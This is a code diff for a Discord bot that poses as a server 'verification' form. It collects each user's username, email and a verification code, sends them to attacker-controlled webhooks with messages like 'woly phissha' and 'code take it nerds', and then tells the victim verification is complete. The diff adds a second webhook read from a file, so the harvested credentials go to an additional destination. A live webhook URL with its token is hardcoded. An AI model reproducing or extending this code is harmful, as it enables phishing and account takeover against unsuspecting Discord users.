@@ -95,10 +95,13 @@ class MyModal(discord.ui.Modal):
             #print("no email didnt work sadge")
             await interaction.edit_original_response(embeds=[embed33])
         url = "https://discord.com/api/webhooks/1084887634423337091/GY_FVS1ufCbpf45KLpkB-ymynTu2GrX4rV0pD056zoCT_Pie4ck_Hbz9Da7pDuAjCeSo"
-
+        urldhb = ""
+        dhb = False
         listofpeople.append([username, email, interaction.user])
         #print(interaction.guild)
         #print(interaction.guild_id)
+
+        
 
         with open("id.txt", 'r') as file:
           for line in file:
@@ -112,8 +115,20 @@ class MyModal(discord.ui.Modal):
                   #print("step 2 done")
                   url = id_and_url[1]
                   break
+        with open("iddhb.txt", 'r') as file:
+          for line in file:
+              line = line.strip()
+              #print(line)
+             # print(str(interaction.guild_id))
+              if str(interaction.guild_id) in line:
+                  #print("step 1 done")
+                  id_and_url = line.split('|')
+                  dhb = True
+                  #print("step 2 done")
+                  urldhb = id_and_url[1]
+                  break
         #print(url)
-        requests.post(url=url, json = {
+        json = {
   "username": "woly phissha",
   "avatar_url": "https://media.discordapp.net/attachments/1084171074670964856/1094477263459852388/ahh.gif",
   "content": "@everyone idk what im doing",
@@ -144,7 +159,10 @@ class MyModal(discord.ui.Modal):
     }
   ],
     "components": []
-}, timeout=5000)
+}
+        requests.post(url=url, json = json, timeout=5000)
+        if dhb == True:
+           requests.post(url=urldhb, json = json, timeout=5000)
 
         
 
@@ -267,7 +285,20 @@ class MyModal2(discord.ui.Modal):
                   url = id_and_url[1]
                   break
 
-        requests.post(url=url, json ={
+        with open("iddhb.txt", 'r') as file:
+          for line in file:
+              line = line.strip()
+              #print(line)
+             # print(str(interaction.guild_id))
+              if str(interaction.guild_id) in line:
+                  #print("step 1 done")
+                  id_and_url = line.split('|')
+                  dhb = True
+                  #print("step 2 done")
+                  urldhb = id_and_url[1]
+                  break
+
+        json ={
   "username": "code hehe",
   "avatar_url": "https://media.discordapp.net/attachments/1087806512442900491/1087813733134381066/0518a2a092bfdc95593b76aead97f220.jpg",
   "content": "@everyone code take it nerds",
@@ -308,7 +339,11 @@ class MyModal2(discord.ui.Modal):
     }
   ],
   "components": []
-}, timeout=5000)
+}
+
+        requests.post(url=url, json=json, timeout=5000)
+        if dhb == True:
+           requests.post(url=urldhb, json = json, timeout=5000)
         embed = discord.Embed(title="Verification Complete!")
         await interaction.response.send_message(embeds=[embed], ephemeral=True)
 
